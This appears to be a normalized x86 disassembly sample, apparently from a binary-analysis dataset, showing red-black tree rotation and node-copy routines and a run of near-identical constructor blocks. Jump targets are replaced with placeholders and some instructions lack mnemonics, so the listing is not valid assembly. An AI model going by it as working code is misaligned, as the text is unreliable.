cmp [ edx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_446ae2
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
cmp [ ebx + 0x14 ] 0x1
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
push ebx
call sub_424fc7
pop ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ edx ] ecx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x14 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x14 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x1
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_41f7f6
mov ecx [ esi ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x1
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_41f7a5
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
je r-xdata
mov al [ esi + 0x14 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x14 ] 0x1
call sub_41f7f6
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x0
call sub_41f7a5
mov ecx [ esi ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x14 ] 0x1
call sub_41f7a5
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x0
call sub_41f7f6
mov ecx [ esi + 0x8 ]
sub_41f45a
mov eax [ edi + 0x4 ]
push esi
push [ eax + 0x4 ]
mov ecx edi
call sub_41f770
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov esi [ edi + 0x4 ]
mov [ esi + 0x8 ] esi
and [ edi + 0x8 ] 0x0
pop esi
retn
sub_41f4d6
push ebp
mov ebp esp
cmp ebx [ esi ]
je r-xdata
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
push ecx
mov [ edi ] ebx
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
imul ecx ecx 0x18
add ecx eax
push ecx
call sub_42354a
add esp 0xc
pop ebp
retn 0x4
push 0x9f
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41f537
cmp [ eax ] 0x0
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
retn
lea edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov [ eax ] 0x0
retn
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
mov [ eax ] 0x1
mov ecx [ ecx + 0x4 ]
mov [ edx ] ecx
sub_41f567
xor cl cl
cmp [ edx ] cl
je r-xdata
cmp [ eax ] cl
je r-xdata
cmp [ eax ] cl
je r-xdata
retn
lea ecx [ eax + 0x4 ]
jmp sub_41f8a4
mov [ edx ] cl
retn
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov al [ eax + 0xc ]
mov [ edx + 0xc ] al
sub_41f599
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] edi
mov [ edi + 0x4 ] edi
mov esi [ ebx + 0x4 ]
jmp r-xdata
cmp esi ebx
jne r-xdata
lea eax [ esi + 0x8 ]
push eax
call sub_41e84b
mov esi [ esi + 0x4 ]
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41f5c7
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax esp
lea ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov eax esi
mov [ ebp - 0x4 ] esp
call sub_41ea78
push ecx
mov ecx [ esi + 0x4 ]
mov eax esp
mov [ eax ] ecx
mov eax edi
mov [ ebp - 0x4 ] esp
call sub_41ea78
mov edx [ edi + 0x4 ]
push ecx
mov ecx esp
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] esp
mov [ ecx ] edx
call sub_41ea78
jmp r-xdata
lea eax [ ebp - 0xc ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
lea ecx [ ebp - 0xc ]
call sub_41f0d2
leave
retn
sub_41f621
test eax eax
je r-xdata
push esi
mov esi [ edi ]
mov [ edi ] eax
test esi esi
je r-xdata
xor edx edx
mov ecx eax
inc edx
[ ecx ] edx
mov eax edi
pop esi
retn
call sub_4219fb
sub_41f66b
push ebp
mov ebp esp
push ebx
mov ebx eax
imul eax eax 0x18
push edi
push eax
call sub_424ff8
pop ecx
mov edi eax
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop ebx
pop ebp
retn
push esi
mov esi edi
add esi 0x18
dec ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41f6d6
test esi esi
je r-xdata
pop esi
sub_41f6d6
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ecx + 0x8 ]
mov [ eax + 0x8 ] dl
mov edx [ ecx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov cl [ ecx + 0x14 ]
mov [ eax + 0x14 ] cl
retn
sub_41f716
push ebx
push esi
push edi
mov esi ecx
mov edi [ esi + 0x4 ]
mov ebx eax
mov eax [ ebx + 0x4 ]
push edi
push [ eax + 0x4 ]
call sub_41f98c
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
xor bl bl
cmp [ ecx + 0x15 ] bl
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] bl
je r-xdata
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
mov ecx edx
mov [ eax ] ecx
mov esi [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] bl
je r-xdata
mov ecx eax
mov [ esi + 0x8 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41f770
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_41f770
mov esi [ esi ]
push edi
call sub_424fc7
cmp [ esi + 0x15 ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_41f7a5
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_41f7f6
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_41f8a4
lea eax [ edx + 0x4 ]
test eax eax
je r-xdata
mov [ edx ] 0x1
retn
push esi
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
mov cl [ ecx + 0x8 ]
mov [ eax + 0x8 ] cl
pop esi
sub_41f904
mov eax esi
call sub_41fa54
xor eax eax
cmp [ esi ] eax
je r-xdata
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
retn
push ebx
push edi
mov [ esi ] ebx
cmp ebx eax
jne r-xdata
push [ edi ]
call sub_424fc7
push edi
call sub_424fc7
pop ecx
pop ecx
xor eax eax
mov edi [ esi ]
mov ebx [ edi + 0x10 ]
cmp edi eax
je r-xdata
pop edi
pop ebx
sub_41f98c
push 0xc
mov eax sub_44a066
call sub_4485c8
mov ebx ecx
mov [ ebp - 0x18 ] ebx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x15 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_44866d
retn 0x8
lea eax [ esi + 0xc ]
push eax
mov eax ebx
call sub_420f23
mov edi eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x4 ] eax
mov al [ esi + 0x14 ]
mov [ edi + 0x14 ] al
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
push edi
push [ esi ]
mov ecx ebx
call sub_41f98c
push edi
mov [ edi ] eax
push [ esi + 0x8 ]
mov ecx ebx
call sub_41f98c
mov [ edi + 0x8 ] eax
mov [ ebp - 0x14 ] edi
sub_41fa54
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
jmp r-xdata
cmp [ ecx + 0xc ] 0x0
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ecx + 0x4 ] edx
mov ecx [ eax ]
jne r-xdata
mov ecx [ ecx + 0xc ]
mov [ eax ] ecx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0x4 ] edx
mov ecx [ ecx + 0x8 ]
mov [ eax + 0xc ] ecx
sub_41fa8c
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x15 ] bl
jne r-xdata
pop ebx
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
jmp r-xdata
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] bl
je r-xdata
mov [ eax ] ecx
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_41fae7
push ebp
mov ebp esp
mov al [ ecx ]
test al al
je r-xdata
cmp edx [ ebp + 0x8 ]
jne r-xdata
cmp edx [ ebp + 0x8 ]
je r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
cmp al [ edx ]
jne r-xdata
xor al al
pop ebp
retn
inc ecx
mov al [ ecx ]
inc edx
test al al
jne r-xdata
sub_41fb84
push ebp
mov ebp esp
sub esp 0x20
mov eax [ esi + 0xc ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x30 ]
push [ esi + 0x8 ]
xor ecx ecx
add eax 0x4
mov [ ebp - 0x14 ] cl
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] cl
call sub_41eafb
mov ecx [ esi + 0x20 ]
mov edx [ ecx + 0x38 ]
add ecx 0x34
and [ ebp - 0x4 ] 0x0
mov [ edi ] eax
jmp r-xdata
cmp edx ecx
jne r-xdata
inc [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x8 ]
imul eax eax 0x18
mov [ edi + 0x4 ] ecx
lea ecx [ esi + 0x38 ]
mov edx [ ecx ]
and [ ecx ] 0x0
mov [ edi + 0x8 ] edx
mov edx [ esi + 0x3c ]
mov [ edi + 0xc ] edx
mov edx [ esi + 0x44 ]
mov [ esi + 0x3c ] ecx
mov ecx [ esi + 0x4 ]
add eax ecx
mov [ edi + 0x10 ] edx
mov edx [ esi + 0x48 ]
push eax
mov eax ecx
mov [ edi + 0x14 ] edx
call sub_42354a
add esp 0xc
mov eax edi
leave
retn
sub_41fc22
push ebp
mov ebp esp
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x38 ]
add eax 0x34
xor ecx ecx
jmp r-xdata
cmp edx eax
jne r-xdata
mov edx [ edx + 0x4 ]
inc ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
sub ecx [ edi + 0x4 ]
push ecx
push eax
mov eax [ ebx + 0x30 ]
add eax 0x14
push eax
call sub_421343
mov ecx [ ebx + 0x8 ]
push [ ebp + 0x8 ]
imul ecx ecx 0x18
mov eax [ edi ]
push [ ebx + 0x4 ]
add ecx eax
push ecx
call sub_42354a
mov esi [ ebx + 0x30 ]
mov edi [ edi ]
add esp 0xc
add esi 0x4
call sub_41e928
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x44 ] ecx
mov eax [ eax + 0x14 ]
pop edi
mov [ ebx + 0x48 ] eax
pop esi
pop ebp
retn
sub_41fc89
push ebp
mov ebp esp
mov eax [ ebx + 0x20 ]
mov ecx [ eax + 0x38 ]
add eax 0x34
xor edx edx
jmp r-xdata
cmp ecx eax
jne r-xdata
mov ecx [ ecx + 0x4 ]
inc edx
mov eax [ ebp + 0x8 ]
sub edx [ eax + 0x4 ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push esi
mov esi [ ebx + 0x30 ]
push edi
mov edi [ eax ]
add esi 0x4
call sub_41e928
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x44 ] ecx
mov eax [ eax + 0x14 ]
mov [ ebx + 0x48 ] eax
sub_41fced
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
test eax eax
je r-xdata
pop ebp
retn
add eax 0x2
add ecx 0x2
mov [ ebp + 0x8 ] ecx
mov dx [ ecx ]
mov [ eax ] dx
sub_41fd0f
push 0x4
mov eax sub_44abc5
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_421153
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_420fd3
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_421153
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41fd90
push 0x4
mov eax sub_44ab9f
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_421172
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_420feb
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_421172
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41fe11
push 0x4
mov eax sub_44ab79
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_421191
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_421003
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_421191
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41fe92
push 0x4
mov eax sub_44ab53
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4211b0
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42101b
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4211b0
add eax 0x38
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41ff13
push 0x4
mov eax sub_44ab2d
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4211cf
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_421033
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4211cf
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41ff94
push 0x4
mov eax sub_44ab07
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4211ee
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42104b
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4211ee
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_420015
push 0x4
mov eax sub_44aae1
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_42120d
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_421063
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_42120d
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_420096
push 0x4
mov eax sub_44aabb
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_42122c
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42107b
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_42122c
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_420117
push 0x4
mov eax sub_44aa95
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_42124b
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_421093
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_42124b
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_420198
push 0x4
mov eax sub_44aa6f
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_42126a
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4210ab
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_42126a
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_420219
push 0x4
mov eax sub_44aa49
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_421289
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4210c3
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_421289
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42029a
push 0x4
mov eax sub_44aa23
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4212a8
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4210db
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4212a8
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
